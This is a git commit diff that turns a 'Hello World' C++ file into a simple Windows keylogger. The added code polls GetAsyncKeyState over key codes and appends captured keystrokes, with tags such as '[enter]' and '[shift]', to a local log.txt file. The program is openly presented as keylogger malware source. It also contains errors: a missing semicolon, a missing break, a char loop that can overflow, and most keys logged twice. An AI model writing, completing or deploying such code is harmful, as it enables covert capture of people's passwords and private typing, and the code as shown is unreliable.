06049e859a4a5c9fba81f787fc9f00f99f3d5320
chandrakamalsingh007 <chandrakamalsingh007@gmail.com>
2025-02-08 09:44:21 +0545

    simple keylogger program for windows

--- keylogger.cpp
+++ keylogger.cpp
@@ -1,6 +1,51 @@
 #include<iostream>
+#include<windows.h>
+#include<winuser.h>
+#include<fstream>
 using namespace std;
 
+void startLogging();
+
 int main(){
-    cout<<"Hello World";
+    startLogging();
+}
+
+void startLogging(){
+    char c;
+    while(true){
+        for( c = 0; c<=254 ; c++){
+            if(GetAsyncKeyState(c) & 0x1){
+                ofstream log;
+                log.open("log.txt",ios::app);
+                log << c;
+                switch(c){
+                    case VK_BACK:
+                        log << "[backspace]";
+                        break;
+                    case VK_RETURN:
+                        log << "[enter]";
+                        break;
+                    case VK_SHIFT:
+                        log << "[shift]";
+                        break;
+                    case VK_CONTROL:
+                        log << "[control]"
+                        break;
+                    case VK_CAPITAL:
+                        log << "[cap]";
+                        break;
+                    case VK_TAB:
+                        log << "[tab]";
+                        break;
+                    case VK_MENU:
+                        log << "[alt]";
+                    case VK_LBUTTON:
+                    case VK_RBUTTON:
+                        break;
+                    default:
+                        log << c;
+                }
+            }
+        }
+    }
 }
